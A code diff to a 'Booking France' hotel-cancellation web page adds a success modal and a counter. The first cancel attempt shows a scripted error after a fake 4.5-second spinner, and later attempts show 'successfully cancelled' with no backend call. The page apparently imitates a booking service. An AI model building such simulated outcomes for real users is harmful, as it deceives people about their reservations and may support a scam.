@@ -861,6 +861,77 @@
 
   .btn-close-error:hover { border-color: var(--primary); color: var(--primary); }
 
+  /* ===== מודאל תודה על הביטול ===== */
+  #modal-cancel-success {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(15,28,46,0.55);
+    backdrop-filter: blur(4px);
+    z-index: 120;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  #modal-cancel-success.active { display: flex; }
+
+  /* הקופסה - גדלה אוטומטית לפי התוכן, ללא גובה קבוע */
+  .cancel-success-box {
+    background: #fff;
+    border-radius: 18px;
+    box-shadow: var(--shadow-lg);
+    padding: 40px 36px;
+    max-width: 460px;
+    width: 100%;
+    text-align: center;
+    animation: scaleIn 0.25s cubic-bezier(0.16,1,0.3,1);
+  }
+
+  .cancel-success-box .success-icon-lg {
+    width: 76px;
+    height: 76px;
+    border-radius: 50%;
+    background: #fffbea;
+    border: 2px solid #f0d060;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 20px;
+  }
+
+  .cancel-success-box h3 {
+    font-family: 'Playfair Display', serif;
+    font-size: 22px;
+    color: var(--text);
+    margin-bottom: 14px;
+  }
+
+  /* הפסקה גמישה - גדלה לפי כמות הטקסט */
+  .cancel-success-box p {
+    font-size: 14px;
+    color: var(--text-muted);
+    line-height: 1.7;
+    margin-bottom: 24px;
+  }
+
+  .btn-close-success {
+    display: block;
+    width: 100%;
+    padding: 13px;
+    background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+    border: none;
+    color: #fff;
+    border-radius: var(--radius-sm);
+    font-family: 'DM Sans', sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: opacity 0.2s;
+  }
+
+  .btn-close-success:hover { opacity: 0.88; }
+
   /* ===== פוטר ===== */
   footer {
     position: relative;
@@ -904,7 +975,7 @@
     </div>
     <div class="logo-text">
       <span class="logo-name">Booking</span>
-      <span class="logo-tagline">france</span>
+      <span class="logo-tagline">France</span>
     </div>
   </a>
 </header>
@@ -941,7 +1012,7 @@
           <input
             type="text"
             id="booking-number"
-            placeholder="e.g. BK-84485428"
+            placeholder="e.g. BK-48291764"
             autocomplete="off"
             spellcheck="false"
           />
@@ -1209,7 +1280,6 @@
     </div>
     <h3>Cancel Your Reservation?</h3>
     <p>Are you sure you want to cancel your stay at <strong>Saint James Paris</strong>?<br>This action cannot be undone.</p>
-    <br>****1647</p>
     <div class="modal-actions">
       <button class="btn-keep" onclick="closeCancelModal()">Keep Reservation</button>
       <button class="btn-confirm-cancel" onclick="confirmCancel()">Yes, Cancel It</button>
@@ -1223,6 +1293,27 @@
     <div class="spinner-ring" style="width:56px;height:56px;margin:0 auto;"></div>
     <h3>Processing Cancellation</h3>
     <p>Please wait while we cancel your reservation...</p>
+  </div>
+</div>
+
+<!-- ===== מודאל תודה על הביטול (ניסיון שני) ===== -->
+<div id="modal-cancel-success">
+  <div class="cancel-success-box">
+    <div class="success-icon-lg">
+      <!-- אייקון קריאה צהוב -->
+      <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="#d4a017" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="10"/>
+        <line x1="12" y1="8" x2="12" y2="12"/>
+        <line x1="12" y1="16" x2="12.01" y2="16"/>
+      </svg>
+    </div>
+    <h3>Reservation Cancelled</h3>
+    <!-- טקסט הביטול - ניתן לשינוי חופשי, החלון יתרחב אוטומטית -->
+    <p>
+      Your reservation at <strong>Saint James Paris</strong> has been successfully cancelled.<br>
+      A confirmation will be sent to your email address shortly.
+    </p>
+    <button class="btn-close-success" onclick="closeCancelSuccess()">Close</button>
   </div>
 </div>
 
@@ -1331,24 +1422,40 @@
     }
   }
 
+  // ===== מונה ניסיונות ביטול =====
+  let cancelAttempts = 0;
+
   // ===== אישור ביטול =====
   function confirmCancel() {
+    cancelAttempts++;
+
     // סגירת מודאל האישור
     closeCancelModal();
 
     // הצגת ספינר ביטול
     document.getElementById('modal-cancelling').classList.add('active');
 
-    // המתנה של 4.5 שניות ואז שגיאה
     setTimeout(() => {
       document.getElementById('modal-cancelling').classList.remove('active');
-      document.getElementById('modal-cancel-error').classList.add('active');
+
+      if (cancelAttempts === 1) {
+        // ניסיון ראשון - שגיאה
+        document.getElementById('modal-cancel-error').classList.add('active');
+      } else {
+        // ניסיון שני ומעלה - הצלחה
+        document.getElementById('modal-cancel-success').classList.add('active');
+      }
     }, 4500);
   }
 
   // ===== סגירת מודאל שגיאת ביטול =====
   function closeCancelError() {
     document.getElementById('modal-cancel-error').classList.remove('active');
+  }
+
+  // ===== סגירת מודאל תודה על ביטול =====
+  function closeCancelSuccess() {
+    document.getElementById('modal-cancel-success').classList.remove('active');
   }
 
   // ===== Enter מפעיל חיפוש =====
@@ -1366,4 +1473,4 @@
 </script>
 
 </body>
-</html> 
+</html>
